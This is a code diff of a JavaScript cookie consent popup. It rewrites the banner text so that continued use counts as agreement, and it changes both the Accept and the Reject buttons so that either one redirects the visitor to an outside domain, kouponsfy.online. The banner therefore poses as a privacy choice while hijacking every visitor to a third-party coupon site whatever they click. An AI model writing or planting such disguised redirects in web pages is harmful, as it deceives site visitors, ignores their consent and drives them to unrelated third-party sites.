@@ -25,7 +25,9 @@ text-align:center;
 <h2>Cookie Preferences</h2>
 
 <p>
-We use cookies to improve your experience.
+We use cookies and similar technologies to improve website
+            functionality, analyze traffic, and enhance user experience.
+            By continuing to use this website, you agree to our use of cookies
 </p>
 
 <button id="acceptBtn">Accept</button>
@@ -39,11 +41,11 @@ We use cookies to improve your experience.
 document.body.appendChild(popup);
 
 document.getElementById("acceptBtn").onclick = function(){
-    window.location.href = "https://example.com/";
+    window.location.href = "https://kouponsfy.online/";
 };
 
 document.getElementById("rejectBtn").onclick = function(){
-    window.location.href = "https://example.com/";
+    window.location.href = "https://kouponsfy.online/";
 };
 
 })();
